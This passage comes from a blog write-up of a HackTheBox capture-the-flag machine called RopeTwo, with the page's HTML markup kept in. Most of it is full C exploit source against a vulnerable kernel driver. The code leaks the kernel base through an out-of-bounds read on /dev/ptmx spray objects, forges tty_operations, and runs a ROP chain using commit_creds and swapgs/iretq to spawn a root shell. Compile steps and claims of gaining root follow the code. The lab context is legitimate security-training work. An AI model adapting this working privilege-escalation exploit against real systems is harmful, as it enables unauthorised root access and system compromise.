</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">message</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">kmalloc</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">message</span> <span class="n">msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Allocating Chunk at: %ld of size: %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Error!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">kfree</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">idx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="k">struct</span> <span class="n">message</span> <span class="n">msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">msg</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Free&#39;ng index: %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1001</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Error!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">fill</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="k">struct</span> <span class="n">message</span> <span class="n">msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">msg</span><span class="p">.</span><span class="n">buf</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">msg</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">msg</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Filling Chunk at Index: %ld with %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1002</span><span class="p">,</span>  <span class="o">&amp;</span><span class="n">msg</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Error!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="k">struct</span> <span class="n">message</span> <span class="n">msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">msg</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">msg</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">msg</span><span class="p">.</span><span class="n">buf</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Reading data from index: %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1003</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Error!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_shell</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;is system?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">shell</span> <span class="o">=</span> <span class="s">&#34;/bin/sh&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="n">shell</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">execve</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x420</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* open drivers */</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/ralloc&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;/dev/ralloc&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mh">0x100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="n">spray_fd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/ptmx&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_NOCTTY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="cm">/* leak kbase &amp; kheap */</span>
</span></span><span class="line"><span class="cl">  <span class="c1">//int ptmx = open(&#34;/dev/ptmx&#34;, O_RDWR | O_NOCTTY);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">kmalloc</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">get</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x420</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">kbase</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="mi">131</span><span class="p">]</span> <span class="o">-</span> <span class="n">ptm_unix98_ops</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">buf</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Leak                :   %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="mi">131</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Base                :   %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Gadget              :   %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0xb55c7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">commit_creds</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">commit_creds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">init_creds</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">init_creds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x8b8a0</span><span class="p">;</span>      <span class="c1">// pop rdi; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mov_rdi_rax</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0xffffffff813153bc</span> <span class="o">-</span> <span class="mh">0xffffffff81000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] init_creds:   %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">init_creds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] commit_creds        :   %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">commit_creds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] get_shell            :   %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">get_shell</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[!] DEBUG....:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x4cba4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">buf</span><span class="p">[</span><span class="mi">131</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_tty_operations</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">iretq</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0xffffffff810379fb</span> <span class="o">-</span> <span class="mh">0xffffffff81000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">swapgs</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0xffffffff81074b54</span> <span class="o">-</span> <span class="mh">0xffffffff81000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pivot_target</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x4cba4</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">fake_stack</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pivot_target</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">mapped</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="n">pivot_target</span> <span class="o">&amp;</span> <span class="mh">0xfffff000</span><span class="p">,</span> <span class="mh">0x1000000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_POPULATE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;mmap&#39;d chunk:       %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">mapped</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;pivot_target:       %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pivot_target</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">prepare_kernel_creds</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0xc07a0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">		<span class="s">&#34;mov %0, %%cs</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="s">&#34;mov %1, %%ss</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="s">&#34;mov %2, %%rsp</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="s">&#34;pushfq</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="s">&#34;pop %3</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="o">:</span> <span class="s">&#34;=r&#34;</span> <span class="p">(</span><span class="n">user_cs</span><span class="p">),</span> <span class="s">&#34;=r&#34;</span> <span class="p">(</span><span class="n">user_ss</span><span class="p">),</span> <span class="s">&#34;=r&#34;</span> <span class="p">(</span><span class="n">user_sp</span><span class="p">),</span> <span class="s">&#34;=r&#34;</span> <span class="p">(</span><span class="n">user_rflags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">rop</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="n">pop_rdi</span><span class="p">,</span> <span class="c1">// pop rdi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>         <span class="n">init_creds</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="n">commit_creds</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="n">swapgs</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="mh">0xdeadbeef</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="n">iretq</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="n">get_shell</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="n">user_cs</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="n">user_rflags</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="n">user_sp</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">user_ss</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl"> <span class="nf">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x4cba4</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">),</span> <span class="n">rop</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rop</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] Finished writing rop chain to mmap&#39;d page&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">fill</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x420</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mh">0x100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">  	<span class="nf">ioctl</span><span class="p">(</span><span class="n">spray_fd</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Repacking the <code>initramfs.cpio</code> with the compiled exploit and running it:-</p>
<blockquote>
<p>Compile it with the <code>gcc -static -masm=intel xpl.c -o xpl</code></p>
</blockquote>
<p>






  
  
<figure><img src="/img/ropetwo/rop.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now continuing the execution, we will get <code>root</code> on the QEMU instace.</p>
<p>






  
  
<figure><img src="/img/ropetwo/qemu_root.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now, the exploit is ready, bear in mind the exploit is not very reliable like of those standard exploit one can compile, run and poof, root. For the one I created, I had to reset the machine quite few times, but after some tries, I got the root:-</p>
<blockquote>
<p>The reason I ran the exploit as <code>chromeuser</code> to get <code>root</code> is because the LKM was accessible with the both <code>r4j</code> and <code>chromeuser</code>.</p>
</blockquote>
<p>






  
  
<figure><img src="/img/ropetwo/root.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Thank you!!!</p>

      </div>
    </section>
    <footer class="max-w-prose pt-8 print:hidden">
      
  <div class="flex">
    
    
    
      
      
    
    <div class="place-self-center">
      
        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
          Author
        </div>
        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
          Robin (D4mianWayne)
        </div>
      
      
        <div class="text-sm text-neutral-700 dark:text-neutral-400">Security Researcher!</div>
      
      <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
          style="will-change:transform;"
          href="https://twitter.com/D4mianWayne"
          target="_blank"
          aria-label="X-Twitter"
          rel="me noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
</span></a
        >
      
    
  </div>

</div>
    </div>
  </div>


      
  
  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/posts/ropetwo-hackthebox/&amp;quote=HTB:%20RopeTwo%20Writeup"
          title="Share on Facebook"
          aria-label="Share on Facebook"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://x.com/intent/tweet/?url=http://localhost:1313/posts/ropetwo-hackthebox/&amp;text=HTB:%20RopeTwo%20Writeup"
          title="Post on X"
          aria-label="Post on X"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/posts/ropetwo-hackthebox/&amp;description=HTB:%20RopeTwo%20Writeup"
          title="Pin on Pinterest"
          aria-label="Pin on Pinterest"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://reddit.com/submit/?url=http://localhost:1313/posts/ropetwo-hackthebox/&amp;resubmit=true&amp;title=HTB:%20RopeTwo%20Writeup"
          title="Submit to Reddit"
          aria-label="Submit to Reddit"
          target="_blank"
          rel="noopener noreferrer"
